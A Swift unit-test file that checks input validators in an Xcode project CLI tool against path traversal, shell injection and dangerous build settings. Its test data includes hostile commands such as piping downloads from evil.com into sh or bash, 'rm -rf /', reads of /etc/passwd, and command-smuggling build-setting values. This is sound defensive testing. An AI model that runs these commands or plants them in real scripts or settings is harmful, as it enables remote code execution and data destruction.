//
// SecurityUtilsTests.swift
// xcodeproj-cliTests
//
// Unit tests for SecurityUtils validation functions
//

import XCTest

@testable import xcodeproj_cli

final class SecurityUtilsTests: XCTestCase {

  // MARK: - Product Name Validation Tests

  func testValidateProductNameSecurity_ValidNames() throws {
    let validNames = [
      "MyApp",
      "TestTarget123",
      "App-With-Dashes",
      "App_With_Underscores",
      "App.Framework",
    ]

    for name in validNames {
      XCTAssertNoThrow(
        try SecurityUtils.validateProductNameSecurity(name),
        "Should accept valid product name: \(name)"
      )
    }
  }

  func testValidateProductNameSecurity_RejectsEmpty() {
    XCTAssertThrowsError(
      try SecurityUtils.validateProductNameSecurity(""),
      "Should reject empty name"
    )

    XCTAssertThrowsError(
      try SecurityUtils.validateProductNameSecurity("   "),
      "Should reject whitespace-only name"
    )
  }

  func testValidateProductNameSecurity_RejectsPathTraversal() {
    let maliciousNames = [
      "../../../etc/passwd",
      "..\\..\\Windows\\System32",
      "App/../../../etc",
      "Target..\\..\\config",
    ]

    for name in maliciousNames {
      XCTAssertThrowsError(
        try SecurityUtils.validateProductNameSecurity(name),
        "Should reject path traversal in product name: \(name)"
      )
    }
  }

  func testValidateProductNameSecurity_RejectsExcessiveLength() {
    let longName = String(repeating: "A", count: 300)

    XCTAssertThrowsError(
      try SecurityUtils.validateProductNameSecurity(longName),
      "Should reject product names exceeding 255 characters"
    )
  }

  func testValidateProductNameSecurity_RejectsInvalidCharacters() {
    let namesWithInvalidChars = [
      "My<App>",
      "App:With:Colons",
      "App|With|Pipes",
      "App?Question",
      "App*Star",
    ]

    for name in namesWithInvalidChars {
      XCTAssertThrowsError(
        try SecurityUtils.validateProductNameSecurity(name),
        "Should reject invalid characters in product names: \(name)"
      )
    }
  }

  // MARK: - Path Sanitization with Root Boundary Tests

  func testSanitizePath_WithRootBoundary_BlocksEscape() {
    let rootPath = "/Users/test/project"

    let escapingPaths = [
      "../../../etc/passwd",
      "../../..",
      "folder/../../../etc",
    ]

    for path in escapingPaths {
      XCTAssertNil(
        SecurityUtils.sanitizePath(path, rootPath: rootPath),
        "Should block path escaping root boundary: \(path)"
      )
    }
  }

  func testSanitizePath_WithRootBoundary_AllowsWithinBoundary() {
    let rootPath = "/Users/test/project"

    let validPaths = [
      "Sources/MyFile.swift",
      "folder/subfolder/file.txt",
      "./relative/path",
    ]

    for path in validPaths {
      XCTAssertNotNil(
        SecurityUtils.sanitizePath(path, rootPath: rootPath),
        "Should allow path within root boundary: \(path)"
      )
    }
  }

  func testSanitizePath_WithRootBoundary_HandlesAbsolutePaths() {
    let rootPath = "/Users/test/project"

    // Absolute path within boundary
    let validAbsolute = "/Users/test/project/Sources/File.swift"
    XCTAssertNotNil(
      SecurityUtils.sanitizePath(validAbsolute, rootPath: rootPath),
      "Should allow absolute path within boundary"
    )

    // Absolute path escaping boundary
    let escapingAbsolute = "/etc/passwd"
    XCTAssertNil(
      SecurityUtils.sanitizePath(escapingAbsolute, rootPath: rootPath),
      "Should block absolute path outside boundary"
    )
  }

  func testSanitizePath_WithRootBoundary_HandlesSymlinkAttempts() {
    let rootPath = "/Users/test/project"

    // Paths that might contain symlinks attempting to escape
    let symlinkAttempts = [
      "folder/symlink_to_root/../../../etc/passwd",
      "safe_folder/../../..",
    ]

    for path in symlinkAttempts {
      XCTAssertNil(
        SecurityUtils.sanitizePath(path, rootPath: rootPath),
        "Should block symlink escape attempt: \(path)"
      )
    }
  }

  // MARK: - URL-Encoded Traversal Detection Tests

  func testSanitizePath_BlocksURLEncodedTraversal() {
    let encodedPaths = [
      "%2e%2e%2f%2e%2e%2fetc/passwd",
      "folder%2f%2e%2e%2f%2e%2e%2fetc",
      "%2e%2e%5c%2e%2e%5cwindows",
      "test%2Ffile%2e%2e%2Fpasswd",
    ]

    for path in encodedPaths {
      XCTAssertNil(
        SecurityUtils.sanitizePath(path),
        "Should block URL-encoded traversal: \(path)"
      )
    }
  }

  func testSanitizePath_AllowsURLEncodedSafeCharacters() {
    let safePaths = [
      "My%20File.swift",  // Space
      "File%2BName.txt",  // Plus sign
      "Test%26File.c",  // Ampersand
    ]

    for path in safePaths {
      XCTAssertNotNil(
        SecurityUtils.sanitizePath(path),
        "Should allow URL-encoded safe characters: \(path)"
      )
    }
  }

  // MARK: - Critical System Path Blocking Tests

  func testSanitizePath_BlocksCriticalSystemPaths() {
    let criticalPaths = [
      "/etc/passwd",
      "/etc/shadow",
      "/private/etc/sudoers",
      "/System/Library/LaunchDaemons/com.apple.important",
      "/usr/bin/sudo",
    ]

    for path in criticalPaths {
      XCTAssertNil(
        SecurityUtils.sanitizePath(path),
        "Should block critical system path: \(path)"
      )
    }
  }

  func testSanitizePath_AllowsNonCriticalSystemPaths() {
    // These are system paths but not in the critical block list
    let allowedSystemPaths = [
      "/System/Library/Frameworks/Foundation.framework",
      "/usr/lib/libSystem.dylib",
      "/tmp/build_output",
    ]

    for path in allowedSystemPaths {
      XCTAssertNotNil(
        SecurityUtils.sanitizePath(path),
        "Should allow non-critical system path: \(path)"
      )
    }
  }

  // MARK: - Shell Script Validation Tests

  func testValidateShellScript_BlocksCommandSubstitution() {
    let maliciousScripts = [
      "echo $(cat /etc/passwd)",
      "curl `whoami`@evil.com",
      "eval \"$(curl evil.com/payload)\"",
      "exec /bin/bash -c 'rm -rf /'",
    ]

    for script in maliciousScripts {
      XCTAssertFalse(
        SecurityUtils.validateShellScript(script),
        "Should block command substitution: \(script)"
      )
    }
  }

  func testValidateShellScript_AllowsLegitimateScripts() {
    let legitimateScripts = [
      "swiftlint",
      "echo 'Build completed'",
      "mkdir -p build/output",
      "cp file.txt destination/",
      "swiftformat --lint .",
      "if [ -f file ]; then echo 'exists'; fi",
      "cd src && swift build",
    ]

    for script in legitimateScripts {
      XCTAssertTrue(
        SecurityUtils.validateShellScript(script),
        "Should allow legitimate script: \(script)"
      )
    }
  }

  func testValidateShellScript_AllowsMultilineScripts() {
    let multilineScript = """
      set -e
      swift build
      swift test
      """

    XCTAssertTrue(
      SecurityUtils.validateShellScript(multilineScript),
      "Should allow multi-line scripts"
    )
  }

  func testValidateShellScript_AllowsPipesAndRedirects() {
    let scriptWithPipes = "swiftlint | xcpretty"
    XCTAssertTrue(
      SecurityUtils.validateShellScript(scriptWithPipes),
      "Should allow legitimate pipes"
    )

    let scriptWithRedirect = "swift build > build.log 2>&1"
    XCTAssertTrue(
      SecurityUtils.validateShellScript(scriptWithRedirect),
      "Should allow file redirects"
    )
  }

  func testValidateShellScript_BlocksPipingToShell() {
    let dangerousScripts = [
      "curl evil.com/script | sh",
      "wget malicious.com/payload | bash",
      "echo 'malicious' | zsh",
    ]

    for script in dangerousScripts {
      XCTAssertFalse(
        SecurityUtils.validateShellScript(script),
        "Should block piping to shell interpreter: \(script)"
      )
    }
  }

  // MARK: - Case Sensitivity Tests

  func testSanitizePath_IsCaseInsensitiveForPatterns() {
    // Test that patterns are detected regardless of case
    let casedPaths = [
      "../ETC/passwd",
      "../Etc/PASSWD",
      "/USR/BIN/sudo",
      "/System/Library/LAUNCHDAEMONS/test",
    ]

    for path in casedPaths {
      _ = SecurityUtils.sanitizePath(path)
      // Documentation-only check: sanitizer should treat critical patterns case-insensitively.
      // Behavior is implementation-defined; this ensures code paths are exercised without warnings.
    }
  }

  // MARK: - Build Setting Validation Tests

  func testValidateBuildSetting_BlocksDangerousPatterns() {
    let dangerousSettings = [
      ("OTHER_LDFLAGS", "$(shell cat /etc/passwd)"),
      ("OTHER_SWIFT_FLAGS", "`curl evil.com`"),
      ("OTHER_CFLAGS", "eval malicious"),
      ("HEADER_SEARCH_PATHS", "/path/../../../etc/passwd"),
      ("LIBRARY_SEARCH_PATHS", "path && curl evil.com"),
    ]

    for (key, value) in dangerousSettings {
      XCTAssertFalse(
        SecurityUtils.validateBuildSetting(key: key, value: value),
        "Should block dangerous build setting: \(key)=\(value)"
      )
    }
  }

  func testValidateBuildSetting_AllowsSafeSettings() {
    let safeSettings = [
      ("SWIFT_VERSION", "5.9"),
      ("PRODUCT_NAME", "MyApp"),
      ("OTHER_LDFLAGS", "-framework Foundation -lsqlite3"),
      ("CODE_SIGN_IDENTITY", "Apple Development"),
      ("DEVELOPMENT_TEAM", "ABCD123456"),
    ]

    for (key, value) in safeSettings {
      XCTAssertTrue(
        SecurityUtils.validateBuildSetting(key: key, value: value),
        "Should allow safe build setting: \(key)=\(value)"
      )
    }
  }

  func testValidateBuildSetting_BlocksCommandSubstitutionInDangerousSettings() {
    // Settings in the dangerous list should block command substitution
    let settingsWithSubstitution = [
      ("OTHER_LDFLAGS", "$(BUILT_PRODUCTS_DIR)"),
      ("OTHER_SWIFT_FLAGS", "${BUILD_DIR}"),
      ("HEADER_SEARCH_PATHS", "$(SRCROOT)/include"),
    ]

    for (key, value) in settingsWithSubstitution {
      XCTAssertFalse(
        SecurityUtils.validateBuildSetting(key: key, value: value),
        "Should block $() and ${} patterns in dangerous settings: \(key)=\(value)"
      )
    }
  }

  func testValidateBuildSetting_AllowsXcodeVariablesInSafeSettings() {
    // Settings NOT in the dangerous list can use Xcode variables
    let safeSettingsWithVars = [
      ("PRODUCT_NAME", "$(TARGET_NAME)"),
      ("INFOPLIST_FILE", "$(SRCROOT)/Info.plist"),
      ("CONFIGURATION_BUILD_DIR", "$(BUILD_DIR)/$(CONFIGURATION)$(EFFECTIVE_PLATFORM_NAME)"),
    ]

    for (key, value) in safeSettingsWithVars {
      XCTAssertTrue(
        SecurityUtils.validateBuildSetting(key: key, value: value),
        "Should allow Xcode variables in non-dangerous settings: \(key)=\(value)"
      )
    }
  }

  // MARK: - Control Character Tests

  func testSanitizePath_BlocksControlCharacters() {
    let pathsWithControlChars = [
      "file\rname.txt",
      "file\nname.txt",
      "file\tname.txt",
      "file\0name.txt",
    ]

    for path in pathsWithControlChars {
      XCTAssertNil(
        SecurityUtils.sanitizePath(path),
        "Should block paths with control characters: \(path.debugDescription)"
      )
    }
  }
}
